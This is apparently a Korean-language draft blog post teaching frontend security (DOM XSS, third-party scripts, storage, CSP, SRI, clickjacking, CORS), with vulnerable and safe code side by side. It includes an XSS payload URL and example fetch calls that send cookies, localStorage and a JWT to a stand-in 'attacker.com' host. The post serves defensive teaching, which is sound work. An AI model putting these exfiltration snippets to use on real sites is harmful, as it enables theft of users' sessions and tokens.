---
title: Frontend 보안 - 알아야 할 핵심 개념
published: false
description: 프론트엔드 보안의 핵심 개념들을 쉽게 설명합니다. DOM 보안, Third-party Script, Browser Storage, CSP, SRI 등에 대해 알아봅니다.
tags: security, frontend, javascript, webdev
cover_image: https://example.com/your-cover-image.jpg
---

# Frontend 보안 - 알아야 할 핵심 개념

프론트엔드는 사용자와 직접 상호작용하는 계층으로, 다양한 보안 위협에 노출되어 있습니다. 이 글에서는 프론트엔드 보안의 핵심 개념들을 실용적인 예제와 함께 설명합니다.

---

## 1. DOM-based Vulnerabilities ⭐️⭐️⭐️

### 개념
DOM(Document Object Model) 기반 취약점은 클라이언트 사이드 JavaScript가 사용자 입력을 안전하지 않게 처리할 때 발생합니다.

### DOM XSS 공격 예시

**취약한 코드:**
```javascript
// 위험! URL에서 직접 값을 가져와 DOM에 삽입
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = `환영합니다, ${name}님!`;

// URL: https://example.com?name=<img src=x onerror=alert('XSS')>
```

**안전한 코드:**
```javascript
// textContent 사용 (HTML을 해석하지 않음)
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').textContent = `환영합니다, ${name}님!`;

// 또는 DOMPurify 사용
import DOMPurify from 'dompurify';
const name = new URLSearchParams(window.location.search).get('name');
const clean = DOMPurify.sanitize(name);
document.getElementById('welcome').innerHTML = `환영합니다, ${clean}님!`;
```

### 위험한 DOM API들

```javascript
// ❌ 위험한 API들
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput, 1000);
setInterval(userInput, 1000);
new Function(userInput);

// ✅ 안전한 대안
element.textContent = userInput;
element.setAttribute('data-value', userInput);
const parser = new DOMParser();
const doc = parser.parseFromString(userInput, 'text/html');
```

### React에서의 DOM 보안

```javascript
// React는 기본적으로 안전
function Welcome({ name }) {
  return <div>환영합니다, {name}님!</div>; // 자동으로 escape
}

// 위험! dangerouslySetInnerHTML
function Comment({ html }) {
  // 사용 전 반드시 sanitize 필요
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## 2. Third-party Script Risks ⭐️⭐️⭐️

### 개념
외부 스크립트는 페이지의 모든 데이터에 접근할 수 있어, 신뢰할 수 없는 스크립트는 심각한 보안 위협이 됩니다.

### 위험성

**외부 스크립트가 할 수 있는 것:**
```javascript
// 모든 쿠키 접근 (httpOnly 제외)
const cookies = document.cookie;

// 모든 localStorage/sessionStorage 접근
const token = localStorage.getItem('authToken');

// 키 입력 가로채기
document.addEventListener('keypress', (e) => {
  // 비밀번호 등을 외부로 전송 가능
});

// 페이지 변조
document.body.innerHTML = '악성 콘텐츠';

// 민감한 정보 전송
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ 
    cookies: document.cookie,
    localStorage: {...localStorage}
  })
});
```

### 안전한 외부 스크립트 사용

**1. Subresource Integrity (SRI) 사용**
```html
<!-- CDN 스크립트에 integrity 속성 추가 -->
<script 
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-9o+vDMRZ0qPpYHVkHU5UG3JvW7fE8pR2Y8eTF0lPsGm7X3gEUlKvW2j8lBv8pRh0"
  crossorigin="anonymous">
</script>

<!-- integrity 해시 생성 -->
<script>
// openssl dgst -sha384 -binary script.js | openssl base64 -A
</script>
```

**2. 신뢰할 수 있는 CDN만 사용**
```javascript
// ✅ 신뢰할 수 있는 CDN
// - cdnjs.cloudflare.com
// - unpkg.com
// - cdn.jsdelivr.net

// ❌ 알 수 없는 CDN은 피하기
```

**3. Content Security Policy (CSP) 설정**
```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' https://cdn.jsdelivr.net; 
               style-src 'self' https://fonts.googleapis.com;">
```

### Google Analytics, Facebook Pixel 등 안전하게 사용

```javascript
// Google Tag Manager를 통한 관리 (권장)
<script>
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-XXXXXX');
</script>

// 민감한 정보는 전송하지 않기
gtag('event', 'purchase', {
  value: 10000,
  currency: 'KRW',
  // ❌ 사용자 이메일, 전화번호 등 전송 금지
});
```

---

## 3. Browser Storage Security ⭐️⭐️

### 개념
브라우저 스토리지(localStorage, sessionStorage, IndexedDB)는 편리하지만, XSS 공격에 취약합니다.

### localStorage vs sessionStorage vs Cookie

```javascript
// localStorage: 영구 저장, 모든 탭 공유
localStorage.setItem('theme', 'dark');

// sessionStorage: 탭 닫으면 삭제
sessionStorage.setItem('tempData', 'value');

// Cookie: 서버로 자동 전송, httpOnly 옵션 가능
document.cookie = "sessionId=abc123; Secure; HttpOnly; SameSite=Strict";
```

### ❌ localStorage에 저장하면 안 되는 것

```javascript
// 절대 안 됨!
localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIs...');
localStorage.setItem('password', 'mypassword123');
localStorage.setItem('creditCard', '1234-5678-9012-3456');
localStorage.setItem('apiKey', 'sk-1234567890');

// XSS 공격으로 쉽게 탈취 가능
<script>
  fetch('https://attacker.com/steal?data=' + localStorage.getItem('jwt'));
</script>
```

### ✅ 안전한 토큰 저장 방법

**1. HttpOnly 쿠키 사용 (권장)**
```javascript
// 서버에서 설정
res.cookie('authToken', token, {
  httpOnly: true,    // JavaScript로 접근 불가
  secure: true,      // HTTPS만
  sameSite: 'strict',
  maxAge: 3600000    // 1시간
});

// 클라이언트에서는 자동으로 전송됨
fetch('/api/user', {
  credentials: 'include' // 쿠키 포함
});
```

**2. 메모리에만 저장 (SPA의 경우)**
```javascript
// Zustand 스토어 예시
import create from 'zustand';

const useAuthStore = create((set) => ({
  token: null,
  setToken: (token) => set({ token }),
  clearToken: () => set({ token: null })
}));

// 페이지 새로고침 시 토큰 재발급 필요
```

**3. sessionStorage + 짧은 만료 시간**
```javascript
// 차선책: sessionStorage 사용 (탭 닫으면 삭제)
const saveToken = (token) => {
  sessionStorage.setItem('tempToken', token);
  
  // 짧은 만료 시간 설정
  setTimeout(() => {
    sessionStorage.removeItem('tempToken');
  }, 15 * 60 * 1000); // 15분
};
```

### IndexedDB 보안

```javascript
// IndexedDB도 XSS에 취약
const request = indexedDB.open('myDatabase', 1);

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // ✅ 민감하지 않은 데이터만 저장
  const transaction = db.transaction(['settings'], 'readwrite');
  const store = transaction.objectStore('settings');
  store.add({ theme: 'dark', language: 'ko' });
  
  // ❌ 민감한 데이터는 저장하지 않기
  // store.add({ password: '...', creditCard: '...' });
};
```

---

## 4. Content Security Policy (CSP) ⭐️⭐️⭐️

### 개념
CSP는 브라우저에게 어떤 리소스를 로드할 수 있는지 알려주는 보안 정책입니다.

### 기본 CSP 설정

```html
<!-- HTML Meta 태그 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' https://cdn.jsdelivr.net; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:; 
               font-src 'self' https://fonts.gstatic.com;">
```

```javascript
// Express.js에서 설정
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  })
);
```

### CSP 지시어 설명

```javascript
// default-src: 모든 리소스의 기본값
"default-src 'self'"

// script-src: JavaScript 소스
"script-src 'self' https://cdn.jsdelivr.net"

// style-src: CSS 소스
"style-src 'self' 'unsafe-inline'" // inline 스타일 허용

// img-src: 이미지 소스
"img-src 'self' data: https:" // data URI와 모든 HTTPS 이미지 허용

// connect-src: fetch, XMLHttpRequest 등
"connect-src 'self' https://api.example.com"

// frame-src: iframe 소스
"frame-src 'none'" // iframe 차단

// object-src: <object>, <embed> 등
"object-src 'none'" // Flash 등 차단
```

### Inline Script 문제 해결

**❌ 인라인 스크립트는 CSP에서 차단됨**
```html
<!-- 차단됨 -->
<script>
  console.log('Hello');
</script>

<button onclick="handleClick()">클릭</button>
```

**✅ 해결 방법 1: 외부 파일로 분리**
```html
<script src="/js/app.js"></script>

<button id="myButton">클릭</button>

<!-- app.js -->
<script>
document.getElementById('myButton').addEventListener('click', handleClick);
</script>
```

**✅ 해결 방법 2: Nonce 사용**
```javascript
// 서버에서 랜덤 nonce 생성
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

res.render('page', { nonce });
```

```html
<!-- 템플릿 -->
<script nonce="<%= nonce %>">
  console.log('허용됨');
</script>
```

### CSP 위반 리포트

```javascript
// CSP 위반 시 서버로 리포트
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      reportUri: '/csp-violation-report'
    }
  })
);

app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP 위반:', req.body);
  // 로깅, 알림 등
  res.status(204).end();
});
```

---

## 5. Subresource Integrity (SRI) ⭐️⭐️

### 개념
SRI는 CDN에서 로드한 파일이 변조되지 않았는지 확인하는 기술입니다.

### SRI 해시 생성 및 사용

```bash
# 해시 생성
openssl dgst -sha384 -binary script.js | openssl base64 -A

# 또는 온라인 도구 사용
# https://www.srihash.org/
```

```html
<!-- SRI 적용 예시 -->
<script 
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We"
  crossorigin="anonymous">
</script>

<link 
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
  integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
  crossorigin="anonymous">
```

### Webpack에서 자동 SRI 생성

```javascript
// webpack.config.js
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous',
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha256', 'sha384'],
      enabled: process.env.NODE_ENV === 'production',
    }),
  ],
};
```

---

## 6. Clickjacking 방지 ⭐️⭐️

### 개념
Clickjacking은 투명한 iframe으로 사용자를 속여 의도하지 않은 동작을 수행하게 만드는 공격입니다.

### X-Frame-Options 헤더

```javascript
// Express.js
app.use((req, res, next) => {
  // iframe 사용 완전 차단
  res.setHeader('X-Frame-Options', 'DENY');
  
  // 같은 도메인만 허용
  // res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  
  // 특정 도메인만 허용
  // res.setHeader('X-Frame-Options', 'ALLOW-FROM https://trusted.com');
  
  next();
});
```

### CSP frame-ancestors

```javascript
// 더 유연한 제어 (권장)
res.setHeader(
  'Content-Security-Policy',
  "frame-ancestors 'none'" // iframe 차단
  // "frame-ancestors 'self'" // 같은 도메인만
  // "frame-ancestors https://trusted.com" // 특정 도메인만
);
```

### JavaScript로 Clickjacking 방지

```javascript
// 페이지가 iframe 안에 있는지 확인
if (window.top !== window.self) {
  // iframe 안에 있음
  
  // 방법 1: 부모 페이지를 현재 페이지로 대체
  window.top.location = window.self.location;
  
  // 방법 2: 경고 표시
  document.body.innerHTML = '<h1>이 페이지는 iframe에서 실행할 수 없습니다.</h1>';
}
```

---

## 7. 민감한 정보 노출 방지 ⭐️⭐️

### 개념
프론트엔드 코드는 누구나 볼 수 있으므로, 민감한 정보를 포함하면 안 됩니다.

### ❌ 절대 하지 말아야 할 것

```javascript
// 소스코드에 하드코딩 금지!
const API_KEY = 'sk-1234567890abcdef';
const SECRET = 'my-secret-key';
const PASSWORD = 'admin123';
const INTERNAL_URL = 'https://internal-api.company.com';

// 콘솔 로그로 민감한 정보 출력 금지
console.log('User password:', password);
console.log('JWT Token:', token);
```

### ✅ 안전한 방법

**1. 환경 변수 사용 (빌드 타임)**
```javascript
// .env
REACT_APP_API_URL=https://api.example.com
NEXT_PUBLIC_API_KEY=pk_public_key_only

// 사용
const apiUrl = process.env.REACT_APP_API_URL;
```

**2. 서버에서 설정 제공**
```javascript
// 서버에서 퍼블릭 설정만 전달
app.get('/api/config', (req, res) => {
  res.json({
    apiUrl: process.env.PUBLIC_API_URL,
    stripePublicKey: process.env.STRIPE_PUBLIC_KEY,
    // privateKey는 절대 전송하지 않음
  });
});

// 클라이언트
const config = await fetch('/api/config').then(r => r.json());
```

**3. 프로덕션에서 콘솔 로그 제거**
```javascript
// Webpack/Vite 설정
if (process.env.NODE_ENV === 'production') {
  console.log = () => {};
  console.warn = () => {};
  console.error = () => {};
}

// 또는 babel-plugin-transform-remove-console 사용
```

---

## 8. CORS Preflight 이해 ⭐️

### 개념
CORS Preflight는 브라우저가 실제 요청 전에 OPTIONS 요청으로 권한을 확인하는 과정입니다.

### Simple Request vs Preflight Request

**Simple Request (Preflight 없음):**
```javascript
// GET, HEAD, POST만
// Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain만
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Content-Type': 'text/plain'
  }
});
```

**Preflight Request (OPTIONS 먼저 전송):**
```javascript
// PUT, DELETE, PATCH 등
// Content-Type: application/json
// 커스텀 헤더 사용
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token'
  },
  body: JSON.stringify({ data: 'value' })
});
```

### 서버에서 CORS 처리

```javascript
// Express.js
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Max-Age', '86400'); // 24시간 캐시
  res.sendStatus(204);
});
```

---

## 결론

프론트엔드 보안 체크리스트:

### 필수 보안 조치 (⭐️⭐️⭐️)
- ✅ DOM API 안전하게 사용 (textContent, DOMPurify)
- ✅ 외부 스크립트에 SRI 적용
- ✅ CSP 헤더 설정

### 중요 보안 조치 (⭐️⭐️)
- ✅ localStorage에 민감한 정보 저장 금지
- ✅ HttpOnly 쿠키 사용
- ✅ X-Frame-Options 설정
- ✅ 소스코드에 민감한 정보 하드코딩 금지

### 추가 보안 강화 (⭐️)
- ✅ CORS 올바르게 설정
- ✅ 프로덕션에서 콘솔 로그 제거
- ✅ 의존성 정기적 업데이트 (npm audit)

**프론트엔드 보안의 핵심은 "클라이언트는 신뢰할 수 없다"는 원칙입니다. 모든 중요한 검증과 인증은 서버에서 수행해야 합니다.**
